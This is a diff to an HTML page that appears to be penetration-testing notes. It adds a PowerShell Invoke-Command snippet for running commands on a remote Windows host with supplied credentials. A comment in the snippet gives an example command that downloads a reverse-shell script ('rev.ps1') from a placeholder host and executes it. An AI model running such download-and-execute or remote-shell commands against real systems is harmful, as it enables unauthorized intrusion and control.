@@ -511,12 +511,18 @@ Also if you are doing this in an interactive command prompt, you could also pass
 <li>
 <p>From Powershell</p>
 <ul>
-<li>Invoke-Command</li>
-</ul>
+<li>
+<p>Invoke-Command</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span>
+<span class="nb">Invoke-Command</span> <span class="n">-Computer</span> <span class="n">COMPUTER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">command</span> <span class="p">}</span> <span class="c">#Example command: iex (New-Object Net.WebClient).DownloadString(&#39;bla/rev.ps1&#39;)</span>
+</code></pre></div>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
 <p>If you are having problems with <a href="https://docs.microsoft.com/es-es/powershell/scripting/learn/remoting/ps-remoting-second-hop?view=powershell-7.1">"powershell double jump"</a> you can pass the <code>-Authentication CredSSP</code> to fix it. </p>
 </div>
+</li>
+</ul>
 </li>
 </ul>
 <h3 id="adding-kerberos-config-in-linux">Adding kerberos config in linux</h3>
